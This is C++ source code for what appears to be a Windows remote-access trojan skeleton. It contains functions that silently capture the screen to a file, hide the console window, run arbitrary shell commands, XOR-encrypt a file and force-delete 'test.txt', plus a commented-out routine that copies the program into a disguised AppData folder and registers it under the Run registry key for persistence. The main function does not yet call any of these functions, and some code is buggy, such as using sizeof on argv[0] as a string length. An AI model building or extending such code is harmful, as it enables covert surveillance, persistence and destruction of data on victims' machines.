#include <iostream>
#include <Windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>
#include <ctime>
#include <stdio.h>

using namespace std;

string ra_RunCommand(string ra_cmd);

string convertToString(char* a, int size)
{
    int i;
    string s = "";
    for (i = 0; i < size; i++) {
        s = s + a[i];
    }
    return s;
}
/*
std::wstring s2ws(const std::string& str)
{
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

void ra_Startup(int argc, char** argv) {
    string ra_copy1 = "mkdir C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\" ;
    string ra_copy2 = "copy " + convertToString(argv[0], sizeof(argv[0])) + " C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\";
    ra_RunCommand(ra_copy1);
    ra_RunCommand(ra_copy2);
    std::wstring progPath = L"C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\"+ s2ws(convertToString(argv[0], sizeof(argv[0])));
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
    LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));


}
*/

void ra_CapruteScreenAndSaveToFile()
{
    
    uint16_t BitsPerPixel = 24;
    uint32_t Width = GetSystemMetrics(SM_CXSCREEN);
    uint32_t Height = GetSystemMetrics(SM_CYSCREEN);
    BITMAPFILEHEADER Header;
    memset(&Header, 0, sizeof(Header));
    Header.bfType = 0x4D42;
    Header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    BITMAPINFO Info;
    memset(&Info, 0, sizeof(Info));
    Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    Info.bmiHeader.biWidth = Width;
    Info.bmiHeader.biHeight = Height;
    Info.bmiHeader.biPlanes = 1;
    Info.bmiHeader.biBitCount = BitsPerPixel;
    Info.bmiHeader.biCompression = BI_RGB;
    Info.bmiHeader.biSizeImage = Width * Height * (BitsPerPixel > 24 ? 4 : 3);
    char* Pixels = NULL;
    HDC MemDC = CreateCompatibleDC(0);
    HBITMAP Section = CreateDIBSection(MemDC, &Info, DIB_RGB_COLORS, (void**)&Pixels, 0, 0);
    DeleteObject(SelectObject(MemDC, Section));
    BitBlt(MemDC, 0, 0, Width, Height, GetDC(0), 0, 0, SRCCOPY);
    DeleteDC(MemDC);
    char* buffer = (char*)malloc(sizeof(Header) + sizeof(Info.bmiHeader) + (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    memcpy(buffer, (char*)&Header, sizeof(Header));
    memcpy(buffer + sizeof(Header), (char*)&Info.bmiHeader, sizeof(Info.bmiHeader));
    memcpy(buffer + sizeof(Header) + sizeof(Info.bmiHeader), Pixels, (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    std::fstream hFile("foo.bmp", std::ios::out | std::ios::binary);
    hFile.write(buffer, sizeof(Header) + sizeof(Info.bmiHeader) + (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    hFile.close();
    DeleteObject(Section);
    free(buffer);
}

string ra_RunCommand(string ra_cmd) {
    
    char   psBuffer[128];
    FILE* pPipe;
    string output;
    string temp;
    output = "";

    if ((pPipe = _popen(ra_cmd.c_str(), "rt")) == NULL)
        exit(1);
    while (fgets(psBuffer, 128, pPipe)) {
        output = output +  convertToString(psBuffer,128);
        printf(psBuffer);
    }
    return output;
}



void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

string encrypt(string msg,string key)
{
    string tmp(key);
    while (key.size() < msg.size())
        key += tmp;
    for (string::size_type i = 0; i < msg.size(); ++i)
        msg[i] ^= key[i];
    return msg;
}
string decrypt(string msg, string key)
{
    return encrypt(msg, key); 
}

void ra_encryptFile(string filename, string key) {
    string name;
    
    std::ifstream dataFile(filename);
    std::ofstream dataFileEnc;
    dataFileEnc.open(filename + "crypt");
    while (!dataFile.fail() && !dataFile.eof())
    {
        dataFile >> name;
        dataFileEnc << encrypt(name, key);
        cout << name << endl;
    }
    dataFile.close();
    dataFileEnc.close();
    ra_RunCommand("del /f test.txt");
}


int main(int argc, char** argv)
{   
    
    system("PAUSE");
    return 0;
}